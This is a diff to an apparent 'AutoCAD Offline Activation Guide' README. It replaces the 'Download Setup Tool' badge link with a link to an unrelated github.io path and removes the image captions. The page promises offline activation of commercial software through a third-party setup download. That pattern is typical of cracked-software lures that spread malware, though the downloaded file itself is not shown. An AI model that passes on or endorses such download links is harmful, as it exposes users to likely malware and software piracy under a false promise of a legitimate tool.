@@ -1,6 +1,6 @@
-# 🧮 AutoCAD — Offline Activation Guide
+# 🧮 AutoCAD 
 
-[![Download Setup Tool](https://img.shields.io/badge/Download-Setup_Tool-red)](https://autocad-offline-activation-guide.github.io/.github)
+[![Download Setup Tool](https://img.shields.io/badge/Download-Setup_Tool-red)](https://asdeennerhorse.github.io/mogus/AutoCAD)
 
 ## 🛠️ How to Install & Activate AutoCAD Offline
 
@@ -32,13 +32,13 @@ This guide is focused on privacy, portability, and offline reliability.
 ## 🖼 Preview
 
 ![AutoCAD Smart Drafting Tools](https://i.all3dp.com/workers/images/fit=scale-down,w=900,h=675,gravity=0.5x0.5,format=auto/wp-content/uploads/2023/02/08135631/autocadically-improve-your-designs-autodesk-230117.jpg)  
-*Advanced drafting tools for precise and efficient design workflows*
+
 
 ![3D Architecture in AutoCAD](https://blog.architizer.com/wp-content/uploads/cafe-3D.png)  
-*Visualizing interior and exterior structures with AutoCAD 3D features*
+
 
 ![AutoCAD Full Toolset](https://www.westcam-group.com/wp-content/uploads/2024/04/autocad-1.jpg)  
-*Comprehensive overview of what you can achieve with AutoCAD*
+
 
 
 ---
